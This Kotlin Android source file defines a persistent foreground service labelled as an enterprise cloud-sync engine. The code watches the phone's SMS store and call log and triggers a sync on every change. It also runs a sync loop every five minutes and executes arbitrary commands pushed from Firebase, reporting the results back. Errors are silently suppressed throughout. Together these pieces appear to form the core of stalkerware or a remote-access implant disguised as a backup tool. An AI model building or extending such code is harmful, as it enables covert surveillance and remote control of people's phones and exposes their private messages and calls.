package com.example.service

import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.EnterpriseSyncApp
import com.example.MainActivity
import com.example.data.sync.FirebaseSyncEngine
import com.example.data.sync.RemoteCommandManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class AlwaysSyncService : Service() {

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    private var smsObserver: ContentObserver? = null
    private var callLogObserver: ContentObserver? = null

    override fun onCreate() {
        super.onCreate()
        try {
            startForegroundServiceNotification()
            registerObservers()
            startPeriodicSyncLoop()
            startFirebaseCommandListener()
        } catch (e: Exception) {
            Log.e("AlwaysSyncService", "Error in onCreate: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundServiceNotification()
        return START_STICKY
    }

    private fun startForegroundServiceNotification() {
        try {
            val intent = Intent(this, MainActivity::class.java)
            val pendingIntent = PendingIntent.getActivity(
                this,
                0,
                intent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )

            val notification = NotificationCompat.Builder(this, EnterpriseSyncApp.CHANNEL_ID_SYNC)
                .setContentTitle("Enterprise Sync Engine Active")
                .setContentText("Real-time cloud backup & device policies running")
                .setSmallIcon(android.R.drawable.ic_popup_sync)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    startForeground(1001, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                } catch (_: Exception) {
                    startForeground(1001, notification)
                }
            } else {
                startForeground(1001, notification)
            }
        } catch (e: Exception) {
            Log.e("AlwaysSyncService", "Failed to start foreground notification: ${e.message}")
        }
    }

    private fun registerObservers() {
        val handler = Handler(Looper.getMainLooper())

        // SMS ContentObserver
        smsObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                triggerImmediateSync("SMS_CHANGE")
            }
        }
        try {
            contentResolver.registerContentObserver(
                Uri.parse("content://sms"),
                true,
                smsObserver!!
            )
        } catch (_: Exception) {}

        // Call Log ContentObserver
        callLogObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                triggerImmediateSync("CALL_LOG_CHANGE")
            }
        }
        try {
            contentResolver.registerContentObserver(
                CallLog.Calls.CONTENT_URI,
                true,
                callLogObserver!!
            )
        } catch (_: Exception) {}
    }

    private fun startPeriodicSyncLoop() {
        serviceScope.launch {
            while (isActive) {
                try {
                    RemoteCommandManager(applicationContext).executeCommand("SYNC_ALL", "Periodic Service Interval (5 Min)")
                } catch (_: Exception) {}
                delay(300000) // 5 minutes periodic background sync
            }
        }
    }

    private fun startFirebaseCommandListener() {
        try {
            val syncEngine = FirebaseSyncEngine(applicationContext)
            val commandManager = RemoteCommandManager(applicationContext)
            syncEngine.startCommandListener { pushId, commandType, params ->
                serviceScope.launch {
                    try {
                        val payload = params["payload"]?.toString()
                            ?: params["text"]?.toString()
                            ?: params["message"]?.toString()
                            ?: params.entries.joinToString("|") { "${it.key}=${it.value}" }
                        val result = commandManager.executeCommand(commandType, payload)
                        syncEngine.updateCommandStatus(pushId, result.status, result.resultMessage)
                    } catch (e: Exception) {
                        syncEngine.updateCommandStatus(pushId, "FAILED", e.message ?: "Execution error")
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun triggerImmediateSync(reason: String) {
        serviceScope.launch {
            try {
                RemoteCommandManager(applicationContext).executeCommand("SYNC_ALL", "Triggered by $reason")
            } catch (_: Exception) {}
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        smsObserver?.let { try { contentResolver.unregisterContentObserver(it) } catch (_: Exception) {} }
        callLogObserver?.let { try { contentResolver.unregisterContentObserver(it) } catch (_: Exception) {} }
        serviceJob.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        fun startService(context: Context) {
            try {
                val intent = Intent(context, AlwaysSyncService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e("AlwaysSyncService", "Failed to start service: ${e.message}")
            }
        }
    }
}
